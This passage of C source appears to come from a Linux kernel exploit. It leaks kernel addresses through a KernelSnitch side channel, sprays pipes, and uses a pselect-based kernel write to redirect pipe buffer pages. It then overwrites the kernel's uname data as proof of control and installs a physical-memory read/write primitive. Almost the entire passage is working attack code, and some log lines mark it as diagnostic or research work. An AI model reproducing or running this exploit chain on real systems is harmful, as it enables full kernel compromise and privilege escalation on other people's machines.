  uintptr_t leaked = current_kernelsnitch_mm_struct();
  cleanup_kernelsnitch();
  if (leaked == (uintptr_t)-1) {
    pr_warning("pipei KernelSnitch mm_struct leak failed\n");
    goto out;
  }
  uintptr_t leaked_page = leaked & ~(uintptr_t)(PAGE_SIZE - 1);
  uintptr_t order_base = leaked & ~(uintptr_t)(ORDER3_SIZE - 1);
  int align_order = pipei_align_order_requested();
  int split_order = pipei_split_order_pages_requested();

  base = align_order || split_order ? order_base : leaked_page;
  if (split_order) {
    pipei_candidate_bases_add_order_pages(order_base);
  } else {
    pipei_candidate_bases_add(base);
  }
  pr_success("pipei candidate base=%016zx leaked=%016zx leaked_page=%016zx "
             "order_base=%016zx align_order=%d split_order=%d "
             "base_count=%zu object_size=0x%x slots_per_page=%d\n",
             base, leaked, leaked_page, order_base, align_order, split_order,
             pipei_candidate_base_count, PIPE_INODE_INFO_SIZE,
             PIPE_INODE_INFO_SLOTS_PER_PAGE);

out:
  close_ctx_memfds(&prep);
  close_ctx_memfds(&spray);
  close_ctx_memfds(&pre);
  close_ctx_memfds(&post);
  kill_ctx_children_once(&prep);
  kill_ctx_children_once(&spray);
  kill_ctx_children_once(&pre);
  kill_ctx_children_once(&post);
  free_ctx_storage(&prep);
  free_ctx_storage(&spray);
  free_ctx_storage(&pre);
  free_ctx_storage(&post);
  if (!base) {
    close_pipe_array(pipei_drain_fds, PIPEI_DRAIN_COUNT);
    close_pipe_array(pipei_reclaim_fds, PIPEI_RECLAIM_COUNT);
  }
  return base;
}

static int pselect_write_once_child(uintptr_t target, uintptr_t value, int idx) {
  pid_t child = SYSCHK(fork());
  if (child == 0) {
    set_pselect_write(target, value);
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
    pr_success("pipei pselect child[%d] target=%016zx value=%016zx shape=%d "
               "workspace=%016zx fake_lock=%016zx fake_w0=%016zx\n",
               idx, target, value, pselect_write_shape(), page_base,
               fake_lock, fake_w0);
    run_main_route_threads();
    _exit(atomic_load(&consumer_success) > 0 ? 0 : 2);
  }

  int status = 0;
  if (waitpid(child, &status, 0) < 0) {
    return 0;
  }
  if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
    pr_warning("pipei pselect child[%d] status=0x%x\n", idx, status);
    return 0;
  }
  return 1;
}

static int write_tmp_page_uname_payload(void) {
  uintptr_t uts_direct = data_addr(INIT_UTS_NS);
  size_t sysname_off = uts_direct & (PAGE_SIZE - 1);
  const char *name = tmp_uname_name();
  size_t name_len = strlen(name) + 1;
  size_t payload_len = sysname_off + name_len;
  int ok = 0;
  int drain_ok = 0;
  int reclaim_ok = 0;
  int live_ok = 0;

  if (name_len > 64 || payload_len > PAGE_SIZE) {
    pr_error("tmp_page uname payload invalid name_len=%zu payload_len=%zu\n",
             name_len, payload_len);
  }
  unsigned char *payload = calloc(1, payload_len);
  if (!payload) {
    pr_error("tmp_page uname payload calloc failed\n");
  }
  memcpy(payload + sysname_off, name, name_len);

  drain_ok = write_pipe_array_payload(
      pipei_drain_fds, PIPEI_DRAIN_COUNT, payload, payload_len);
  reclaim_ok = write_pipe_array_payload(
      pipei_reclaim_fds, PIPEI_RECLAIM_COUNT, payload, payload_len);
  ok += drain_ok + reclaim_ok;
  if (pipei_live_ready) {
    live_ok = write_pipe_array_payload(
        pipei_live_fds, PIPEI_LIVE_COUNT, payload, payload_len);
    ok += live_ok;
  }

  free(payload);
  pr_success("tmp_page uname fanout ok=%d drain=%d/%d reclaim=%d/%d "
             "live=%d/%d sysname_off=0x%zx\n",
             ok, drain_ok, PIPEI_DRAIN_COUNT, reclaim_ok, PIPEI_RECLAIM_COUNT,
             live_ok, pipei_live_ready ? PIPEI_LIVE_COUNT : 0,
             sysname_off);
  return ok > 0;
}

static int write_zero_oracle_payload(int attempt) {
  struct zero_oracle_marker marker;
  int drain_ok;
  int reclaim_ok;
  int live_ok = 0;
  int ok;
  int hit;

  make_zero_oracle_marker(&marker, attempt);
  drain_ok = write_pipe_array_payload(
      pipei_drain_fds, PIPEI_DRAIN_COUNT, &marker, sizeof(marker));
  reclaim_ok = write_pipe_array_payload(
      pipei_reclaim_fds, PIPEI_RECLAIM_COUNT, &marker, sizeof(marker));
  ok = drain_ok + reclaim_ok;
  if (pipei_live_ready) {
    live_ok = write_pipe_array_payload(
        pipei_live_fds, PIPEI_LIVE_COUNT, &marker, sizeof(marker));
    ok += live_ok;
  }
  if (!ok) {
    pr_error("zero oracle fanout produced no successful pipe writes\n");
  }

  hit = zero_page_has_marker(&marker);
  pr_success("zero oracle attempt=%d hit=%d writes=%d drain=%d/%d "
             "reclaim=%d/%d live=%d/%d\n",
             attempt, hit, ok, drain_ok, PIPEI_DRAIN_COUNT, reclaim_ok,
             PIPEI_RECLAIM_COUNT, live_ok,
             pipei_live_ready ? PIPEI_LIVE_COUNT : 0);
  return hit;
}

static void sort_anchor_samples(uintptr_t *samples, size_t count) {
  for (size_t i = 1; i < count; i++) {
    uintptr_t value = samples[i];
    size_t j = i;

    while (j > 0 && samples[j - 1] > value) {
      samples[j] = samples[j - 1];
      j--;
    }
    samples[j] = value;
  }
}

static int select_anchor_window(uintptr_t *samples, size_t count, size_t need,
                                uintptr_t max_spread, uintptr_t *selected,
                                uintptr_t *min_out, uintptr_t *max_out) {
  if (count < need) {
    return 0;
  }

  sort_anchor_samples(samples, count);
  for (size_t i = 0; i + need <= count; i++) {
    uintptr_t min_anchor = samples[i];
    uintptr_t max_anchor = samples[i + need - 1];
    if (!max_spread || max_anchor - min_anchor <= max_spread) {
      *selected = samples[i + need / 2];
      *min_out = min_anchor;
      *max_out = max_anchor;
      return 1;
    }
  }
  return 0;
}

static int select_live_anchor(const char *tag, uintptr_t *selected_out) {
  uintptr_t sample_count = PIPEI_LIVE_ANCHOR_SAMPLES;
  uintptr_t sample_attempts = 0;
  uintptr_t max_spread = PIPEI_LIVE_ANCHOR_MAX_SPREAD;
  uintptr_t samples[512];
  uintptr_t min_anchor = UINTPTR_MAX;
  uintptr_t max_anchor = 0;
  size_t got = 0;

  if (!parse_env_u64("TMP_UNAME_LIVE_ANCHOR_SAMPLES",
                     PIPEI_LIVE_ANCHOR_SAMPLES, 1, 64, &sample_count) ||
      !parse_env_u64("TMP_UNAME_LIVE_ANCHOR_ATTEMPTS",
                     sample_count * 3, sample_count, 512,
                     &sample_attempts) ||
      !parse_env_u64("TMP_UNAME_LIVE_ANCHOR_MAX_SPREAD",
                     PIPEI_LIVE_ANCHOR_MAX_SPREAD, 0, UINTPTR_MAX,
                     &max_spread)) {
    return 0;
  }

  for (size_t i = 0; i < (size_t)sample_attempts; i++) {
    uintptr_t anchor = leak_kernelsnitch_anchor_once(tag);
    if (!anchor) {
      pr_warning("%s anchor attempt[%zu] failed\n", tag, i);
      continue;
    }
    samples[got] = anchor;
    if (anchor < min_anchor) {
      min_anchor = anchor;
    }
    if (anchor > max_anchor) {
      max_anchor = anchor;
    }
    pr_success("%s anchor[%zu/%zu attempt=%zu]=%016zx off=%016zx\n",
               tag, got + 1, (size_t)sample_count, i, anchor,
               (uintptr_t)(anchor - DIRECT_MAP_BASE));
    got++;
    if (select_anchor_window(samples, got, (size_t)sample_count, max_spread,
                             selected_out, &min_anchor, &max_anchor)) {
      pr_success("%s selected anchor=%016zx samples=%zu/%zu attempts=%zu "
                 "min=%016zx max=%016zx spread=%016zx\n",
                 tag, *selected_out, got, (size_t)sample_count,
                 (size_t)sample_attempts, min_anchor, max_anchor,
                 max_anchor - min_anchor);
      return 1;
    }
  }

  if (!got) {
    pr_warning("%s anchor sampling got no valid samples attempts=%zu\n",
               tag, (size_t)sample_attempts);
    return 0;
  }
  if (got < (size_t)sample_count) {
    pr_warning("%s anchor sampling too few valid samples got=%zu need=%zu "
               "attempts=%zu\n",
               tag, got, (size_t)sample_count, (size_t)sample_attempts);
    return 0;
  }

  sort_anchor_samples(samples, got);
  min_anchor = samples[0];
  max_anchor = samples[got - 1];
  pr_warning("%s no tight anchor window got=%zu need=%zu attempts=%zu "
             "min=%016zx max=%016zx spread=%016zx limit=%016zx\n",
             tag, got, (size_t)sample_count, (size_t)sample_attempts,
             min_anchor, max_anchor, max_anchor - min_anchor, max_spread);
  return 0;
}

static void prepare_live_pipe_spray(void) {
  init_pipe_array(pipei_live_fds, PIPEI_LIVE_COUNT);
  for (int i = 0; i < PIPEI_LIVE_COUNT; i++) {
    make_pipe_pair(pipei_live_fds[i]);
  }
  pipei_live_ready = 1;
  pr_success("live pipe spray held pipes=%d\n", PIPEI_LIVE_COUNT);
}

static int live_pipe_dry_run(void) {
  return env_bool("TMP_PAGE_LIVE_DRYRUN", 0) ||
         env_bool("TMP_UNAME_LIVE_DRY_RUN", 0);
}

static int live_pipe_mode_requested(void) {
  const char *biases = getenv("TMP_UNAME_LIVE_PIPE_BIASES");

  return live_pipe_dry_run() || env_bool("TMP_UNAME_LIVE_MODE", 0) ||
         (biases && *biases);
}

static int run_live_pipe_anchor_dryrun(void) {
  uintptr_t anchor = 0;
  int anchor_first = env_bool("TMP_UNAME_LIVE_ANCHOR_FIRST", 0);
  int ok = 0;

  pipei_live_ready = 0;
  if (anchor_first) {
    ok = select_live_anchor("live-dryrun-pre", &anchor);
    if (!ok) {
      pr_warning("live dryrun pre-anchor failed; continuing to post-spray "
                 "samples\n");
    }
  }
  prepare_live_pipe_spray();
  ok = select_live_anchor("live-dryrun", &anchor);
  close_pipe_array(pipei_live_fds, PIPEI_LIVE_COUNT);
  pipei_live_ready = 0;
  return ok;
}

static int live_pipe_seen_target(uintptr_t *seen, size_t count,
                                 uintptr_t target) {
  for (size_t i = 0; i < count; i++) {
    if (seen[i] == target) {
      return 1;
    }
  }
  return 0;
}

static int run_live_pipe_bias_candidates(uintptr_t uts_page, size_t start_slot) {
  const char *env_biases = getenv("TMP_UNAME_LIVE_PIPE_BIASES");
  const char *biases = env_biases && *env_biases ? env_biases :
                       PIPEI_LIVE_DEFAULT_BIASES;
  uintptr_t slot_count = PIPEI_LIVE_SLOT_CANDIDATES;
  uintptr_t max_attempts = PIPEI_LIVE_MAX_ATTEMPTS;
  uintptr_t max_considered = PIPEI_LIVE_MAX_CONSIDERED;
  uintptr_t fanout_retries = 1;
  uintptr_t fanout_retry_usec = 100000;
  int anchor_first = env_bool("TMP_UNAME_LIVE_ANCHOR_FIRST", 0);
  int dry_run = live_pipe_dry_run();
  int zero_oracle = zero_oracle_requested();
  int dedup = env_bool("TMP_UNAME_LIVE_DEDUP_TARGETS",
                       PIPEI_LIVE_DEDUP_TARGETS);
  int align_base = env_bool("TMP_UNAME_LIVE_ALIGN_BASE", 1);
  uintptr_t zero_direct = data_addr(EMPTY_ZERO_PAGE);
  uintptr_t zero_page = direct_to_page(zero_direct);
  uintptr_t anchor = 0;
  uintptr_t *seen_targets = NULL;
  size_t seen_count = 0;
  size_t seen_cap = 0;
  int considered = 0;
  int attempted = 0;
  int success = 0;

  if (!parse_env_u64("TMP_UNAME_LIVE_SLOT_CANDIDATES",
                     PIPEI_LIVE_SLOT_CANDIDATES, 1, 512, &slot_count) ||
      !parse_env_u64("TMP_UNAME_LIVE_MAX_ATTEMPTS",
                     PIPEI_LIVE_MAX_ATTEMPTS, 0, 4096, &max_attempts) ||
      !parse_env_u64("TMP_UNAME_LIVE_MAX_CONSIDERED",
                     PIPEI_LIVE_MAX_CONSIDERED, 0, 4096, &max_considered) ||
      !parse_env_u64("TMP_UNAME_FANOUT_RETRIES", 1, 1, 32,
                     &fanout_retries) ||
      !parse_env_u64("TMP_UNAME_FANOUT_RETRY_USEC", 100000, 0, 5000000,
                     &fanout_retry_usec)) {
    return 0;
  }

  if (!biases || !*biases) {
    pr_warning("live pipe has no default bias profile; refusing auto-write. "
               "Set TMP_UNAME_LIVE_PIPE_BIASES only for diagnostic runs.\n");
    return run_live_pipe_anchor_dryrun();
  }
  if (env_biases && *env_biases) {
    pr_warning("live pipe using explicit bias list; diagnostic only, not "
               "strict no-GDB evidence\n");
  }

  pipei_live_ready = 0;
  if (anchor_first) {
    if (!select_live_anchor("live-pipe-pre", &anchor)) {
      pr_warning("live pipe pre-anchor failed; continuing to post-spray "
                 "samples\n");
    }
    prepare_live_pipe_spray();
    if (!select_live_anchor("live-pipe", &anchor)) {
      goto out;
    }
  } else {
    prepare_live_pipe_spray();
    if (!select_live_anchor("live-pipe", &anchor)) {
      goto out;
    }
  }

  pr_success("live pipe candidate mode anchor=%016zx anchor_off=%016zx "
             "start_slot=%zu slot_count=%zu max_attempts=%zu "
             "max_considered=%zu dry_run=%d zero_oracle=%d "
             "zero_direct=%016zx zero_page=%016zx dedup=%d align=%d "
             "biases='%s'\n",
             anchor, (uintptr_t)(anchor - DIRECT_MAP_BASE), start_slot,
             (size_t)slot_count, (size_t)max_attempts,
             (size_t)max_considered, dry_run, zero_oracle, zero_direct,
             zero_page, dedup, align_base, biases);

  if (dedup) {
    seen_cap = 64;
    seen_targets = calloc(seen_cap, sizeof(*seen_targets));
    if (!seen_targets) {
      pr_error("live pipe seen target calloc failed\n");
    }
  }

  char *copy = strdup(biases);
  if (!copy) {
    pr_error("live pipe bias strdup failed\n");
  }

  char *save = NULL;
  for (char *tok = strtok_r(copy, ",", &save);
       tok; tok = strtok_r(NULL, ",", &save)) {
    int64_t bias = 0;
    uintptr_t base;

    while (*tok == ' ' || *tok == '\t') {
      tok++;
    }
    if (!*tok) {
      continue;
    }
    if (!parse_i64_token(tok, &bias)) {
      pr_warning("bad live pipe bias token: %s\n", tok);
      continue;
    }
    base = (uintptr_t)((int64_t)anchor + bias);
    if (align_base) {
      base &= ~(uintptr_t)(PAGE_SIZE - 1);
    }

    for (size_t n = 0; n < (size_t)slot_count; n++) {
      size_t slot = start_slot + n;
      uintptr_t target = pipe_inode_tmp_page_target(base, slot);
      uintptr_t target_off = target >= DIRECT_MAP_BASE ?
                             target - DIRECT_MAP_BASE : 0;

      if (max_considered && considered >= (int)max_considered) {
        pr_warning("live pipe considered limit reached considered=%d "
                   "attempted=%d limit=%zu\n",
                   considered, attempted, (size_t)max_considered);
        goto out_copy;
      }
      considered++;
      if (target < DIRECT_MAP_BASE || target >= DIRECT_MAP_END) {
        pr_warning("live pipe skip non-direct candidate base=%016zx "
                   "slot=%zu target=%016zx bias=%lld\n",
                   base, slot, target, (long long)bias);
        continue;
      }
      if (dedup && live_pipe_seen_target(seen_targets, seen_count, target)) {
        pr_info("live pipe skip duplicate target base=%016zx slot=%zu "
                "target=%016zx bias=%lld\n",
                base, slot, target, (long long)bias);
        continue;
      }
      if (max_attempts && attempted >= (int)max_attempts) {
        pr_warning("live pipe attempt limit reached considered=%d "
                   "attempted=%d limit=%zu\n",
                   considered, attempted, (size_t)max_attempts);
        goto out_copy;
      }
      if (dedup) {
        if (seen_count == seen_cap) {
          size_t new_cap = seen_cap * 2;
          uintptr_t *new_seen =
              realloc(seen_targets, new_cap * sizeof(*new_seen));
          if (!new_seen) {
            pr_error("live pipe seen target realloc failed\n");
          }
          seen_targets = new_seen;
          seen_cap = new_cap;
        }
        seen_targets[seen_count++] = target;
      }

      pr_success("live pipe candidate[%d] base=%016zx slot=%zu "
                 "target=%016zx target_off=%016zx bias=%lld\n",
                 attempted, base, slot, target, target_off, (long long)bias);
      attempted++;
      if (dry_run) {
        continue;
      }

      drain_pipe_array_nonblock(pipei_live_fds, PIPEI_LIVE_COUNT);
      if (zero_oracle) {
        pr_success("live pipe zero oracle candidate=%d target=%016zx "
                   "value=%016zx\n",
                   attempted - 1, target, zero_page);
        if (!pselect_write_once_child(target, zero_page, attempted - 1)) {
          continue;
        }
        usleep(200000);
        if (!write_zero_oracle_payload(attempted)) {
          drain_pipe_array_nonblock(pipei_live_fds, PIPEI_LIVE_COUNT);
          continue;
        }
        drain_pipe_array_nonblock(pipei_live_fds, PIPEI_LIVE_COUNT);
      }
      if (!pselect_write_once_child(target, uts_page, attempted - 1)) {
        continue;
      }
      usleep(200000);
      for (size_t retry = 0; retry < (size_t)fanout_retries; retry++) {
        if (!write_tmp_page_uname_payload()) {
          continue;
        }
        print_uname_line("candidate after");
        if (uname_has_tmp_name()) {
          pr_success("live pipe candidate changed uname slot=%zu "
                     "fanout_try=%zu\n",
                     slot, retry + 1);
          success = 1;
          goto out_copy;
        }
        if (retry + 1 < (size_t)fanout_retries && fanout_retry_usec) {
          usleep((useconds_t)fanout_retry_usec);
        }
      }
    }
  }

out_copy:
  free(copy);
out:
  if (dry_run) {
    pr_success("live pipe dry-run enumerated considered=%d attempted=%d "
               "unique_targets=%zu without pselect writes\n",
               considered, attempted, seen_count);
    success = 1;
  } else if (!success) {
    pr_warning("live pipe candidate mode exhausted considered=%d "
               "attempted=%d unique_targets=%zu\n",
               considered, attempted, seen_count);
  }
  free(seen_targets);
  close_pipe_array(pipei_live_fds, PIPEI_LIVE_COUNT);
  pipei_live_ready = 0;
  return success;
}

int run_tmp_page_uname_stage(void) {
  uintptr_t start_slot = 0;
  uintptr_t count = 1;
  uintptr_t hold_sec = TMP_UNAME_DEFAULT_HOLD_SEC;
  uintptr_t prep_attempts = PIPEI_PREP_ATTEMPTS;
  uintptr_t uts_direct = data_addr(INIT_UTS_NS);
  uintptr_t uts_page = direct_to_page(uts_direct);
  int zero_oracle = zero_oracle_requested();
  uintptr_t zero_direct = data_addr(EMPTY_ZERO_PAGE);
  uintptr_t zero_page = direct_to_page(zero_direct);
  uintptr_t max_attempts = 0;
  uintptr_t base;
  size_t base_start;
  size_t base_limit;
  size_t base_end;
  int attempted = 0;
  int success = 0;

  if (!parse_env_u64("TMP_UNAME_PIPEI_SLOT", 0, 0, 511, &start_slot) ||
      !parse_env_u64("TMP_UNAME_PIPEI_SLOT_CANDIDATES", 1, 1, 512, &count) ||
      !parse_env_u64("TMP_UNAME_HOLD_SEC", TMP_UNAME_DEFAULT_HOLD_SEC,
                     0, 86400, &hold_sec) ||
      !parse_env_u64("TMP_UNAME_PIPEI_PREP_ATTEMPTS", PIPEI_PREP_ATTEMPTS,
                     1, 64, &prep_attempts) ||
      !parse_env_u64("TMP_UNAME_PIPEI_MAX_ATTEMPTS", 0, 0, 4096,
                     &max_attempts)) {
    return 0;
  }

  init_pipe_array(pipei_drain_fds, PIPEI_DRAIN_COUNT);
  init_pipe_array(pipei_reclaim_fds, PIPEI_RECLAIM_COUNT);
  init_pipe_array(pipei_live_fds, PIPEI_LIVE_COUNT);
  pipei_live_ready = 0;

  print_uname_line("before");
  if (live_pipe_mode_requested()) {
    pr_success("tmp_page live mode uts_direct=%016zx uts_page=%016zx "
               "name=%s start_slot=%zu\n",
               uts_direct, uts_page, tmp_uname_name(), (size_t)start_slot);
    success = run_live_pipe_bias_candidates(uts_page, (size_t)start_slot);
    print_uname_line("after");
    if (success && hold_sec && !live_pipe_dry_run()) {
      pr_success("tmp_page live mode hold %zu seconds\n", (size_t)hold_sec);
      sleep((unsigned int)hold_sec);
    }
    close_pipe_array(pipei_drain_fds, PIPEI_DRAIN_COUNT);
    close_pipe_array(pipei_reclaim_fds, PIPEI_RECLAIM_COUNT);
    close_pipe_array(pipei_live_fds, PIPEI_LIVE_COUNT);
    clear_pselect_write();
    return success;
  }

  pr_success("tmp_page uname uts_direct=%016zx uts_page=%016zx name=%s "
             "start_slot=%zu count=%zu zero_oracle=%d zero_direct=%016zx "
             "zero_page=%016zx\n",
             uts_direct, uts_page, tmp_uname_name(), (size_t)start_slot,
             (size_t)count, zero_oracle, zero_direct, zero_page);

  base = 0;
  for (size_t attempt = 1; attempt <= (size_t)prep_attempts; attempt++) {
    base = prepare_pipe_inode_candidate_page();
    if (base) {
      break;
    }
    pr_warning("pipei candidate prepare retry %zu/%zu\n",
               attempt, (size_t)prep_attempts);
  }
  if (!base) {
    pr_warning("pipei candidate prepare exhausted\n");
    return 0;
  }

  if (!pipei_candidate_base_count) {
    pipei_candidate_bases_add(base);
  }
  base_start = pipei_base_start_index(pipei_candidate_base_count);
  base_limit = pipei_base_limit_count(pipei_candidate_base_count, base_start);
  base_end = base_start + base_limit;
  pr_success("pipei candidate scan base=%016zx base_count=%zu base_start=%zu "
             "base_limit=%zu base_end=%zu start_slot=%zu count_per_base=%zu "
             "max_attempts=%zu\n",
             base, pipei_candidate_base_count, base_start, base_limit,
             base_end, (size_t)start_slot, (size_t)count,
             (size_t)max_attempts);

  for (size_t b = base_start; b < base_end && !success; b++) {
    uintptr_t current_base = pipei_candidate_bases[b];

    for (size_t n = 0; n < (size_t)count; n++) {
      size_t slot = (size_t)start_slot + n;
      uintptr_t target = pipe_inode_tmp_page_target(current_base, slot);
      int candidate_idx;

      if (max_attempts && attempted >= (int)max_attempts) {
        pr_warning("pipei candidate attempt limit reached attempted=%d "
                   "limit=%zu\n", attempted, (size_t)max_attempts);
        goto scan_done;
      }
      candidate_idx = attempted++;
      drain_pipe_array_nonblock(pipei_drain_fds, PIPEI_DRAIN_COUNT);
      drain_pipe_array_nonblock(pipei_reclaim_fds, PIPEI_RECLAIM_COUNT);
      pr_success("pipei candidate[%d] base_idx=%zu/%zu base=%016zx "
                 "slot=%zu target=%016zx value=%016zx\n",
                 candidate_idx, b, pipei_candidate_base_count,
                 current_base, slot, target, uts_page);
      if (zero_oracle) {
        pr_success("pipei zero oracle candidate[%d] base_idx=%zu/%zu "
                   "base=%016zx slot=%zu target=%016zx value=%016zx\n",
                   candidate_idx, b, pipei_candidate_base_count,
                   current_base, slot, target, zero_page);
        if (!pselect_write_once_child(target, zero_page, candidate_idx)) {
          continue;
        }
        usleep(200000);
        if (!write_zero_oracle_payload(candidate_idx + 1)) {
          drain_pipe_array_nonblock(pipei_drain_fds, PIPEI_DRAIN_COUNT);
          drain_pipe_array_nonblock(pipei_reclaim_fds, PIPEI_RECLAIM_COUNT);
          continue;
        }
        drain_pipe_array_nonblock(pipei_drain_fds, PIPEI_DRAIN_COUNT);
        drain_pipe_array_nonblock(pipei_reclaim_fds, PIPEI_RECLAIM_COUNT);
      }
      if (!pselect_write_once_child(target, uts_page, candidate_idx)) {
        continue;
      }
      usleep(200000);
      if (!write_tmp_page_uname_payload()) {
        continue;
      }
      print_uname_line("candidate after");
      if (uname_has_tmp_name()) {
        pr_success("tmp_page uname changed base_idx=%zu slot=%zu\n", b, slot);
        success = 1;
        break;
      }
    }
  }

scan_done:
  print_uname_line("after");
  if (success && hold_sec) {
    pr_success("tmp_page uname hold %zu seconds\n", (size_t)hold_sec);
    sleep((unsigned int)hold_sec);
  }
  close_pipe_array(pipei_drain_fds, PIPEI_DRAIN_COUNT);
  close_pipe_array(pipei_reclaim_fds, PIPEI_RECLAIM_COUNT);
  clear_pselect_write();
  return success;
}

int install_pipe_physrw(int fd) {
  if (pipebuf_page_base == 0) {
    atomic_store(&pipe_prepare_done, 0);
    atomic_store(&pipe_prepare_request, 1);
    while (!atomic_load(&pipe_prepare_done)) {
      usleep(10000);
    }
  }

  uintptr_t proof_addr = page_base + PHYSRW_PROOF_OFF;
  uintptr_t proof_page = page_to_direct(direct_to_page(proof_addr));
  if (proof_page != (proof_addr & ~(PAGE_SIZE - 1))) {
    return 0;
  }
  if (!pipe_reclaim_cache_gate(fd)) {
    pr_info("phys step cache gate failed slab=%016zx want=%016zx\n",
            candidate_slab_cache, kmalloc_pipe_cache);
    return 0;
  }

  char marker[PIPE_RECLAIM];
  memset(marker, 0x61, sizeof(marker));
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    SYSCHK(write(pipe_fds_reclaim[i][1], marker, i + 1));
  }

  int found = find_pipe_buffer(fd, pipebuf_page_base);
  pr_info("phys step pipe probe found=%d pipebuf=%016zx idx=%d scan=%d/%d/%d\n",
          found, pipebuf_addr, pipebuf_pipe_idx, pipe_scan_vmemmap,
          pipe_scan_ops, pipe_scan_len);
  if (!found) {
    return 0;
  }
  if (!pipe_cache_gate_ok) {
    pipe_cache_gate_ok = 2;
  }

  char seed[] = PHYS_READ_TAG;
  if (kernel_write_data(fd, proof_addr, seed, sizeof(seed)) !=
      (ssize_t)sizeof(seed)) {
    return 0;
  }

  memset(physrw_readback, 0, sizeof(physrw_readback));
  physrw_read_ok =
    pipe_phys_read_data(fd, proof_addr, physrw_readback, sizeof(seed));
  pr_info("phys step probed read done ok=%d idx=%d\n",
          physrw_read_ok, pipebuf_pipe_idx);

  char overwrite[] = PHYS_WRITE_TAG;
  physrw_write_ok =
    pipe_phys_write_data(fd, proof_addr, overwrite, sizeof(overwrite));
  pr_info("phys step probed write done ok=%d\n", physrw_write_ok);
  kernel_read_data(fd, proof_addr, physrw_after_write, sizeof(overwrite));

  uintptr_t proof64_addr = proof_addr + 0x100;
  uint64_t seed64 = PHYS64_SEED;
  uint64_t next64 = PHYS64_NEXT;
  kernel_write_data(fd, proof64_addr, &seed64, sizeof(seed64));
  physrw_read64_before = pipe_read64(fd, proof64_addr);
  physrw_read64_ok = physrw_read64_before == seed64;
  pr_info("phys step read64 done ok=%d value=%016zx\n",
          physrw_read64_ok, physrw_read64_before);
  physrw_write64_value = next64;
  physrw_write64_ok = pipe_write64(fd, proof64_addr, next64);
  kernel_read_data(
      fd, proof64_addr, &physrw_read64_after, sizeof(physrw_read64_after));
  physrw_write64_ok =
    physrw_write64_ok && physrw_read64_after == physrw_write64_value;

  return physrw_read_ok &&
         memcmp(physrw_readback, seed, sizeof(seed)) == 0 &&
         physrw_write_ok &&
         memcmp(physrw_after_write, overwrite, sizeof(overwrite)) == 0 &&
         physrw_read64_ok && physrw_write64_ok;
}
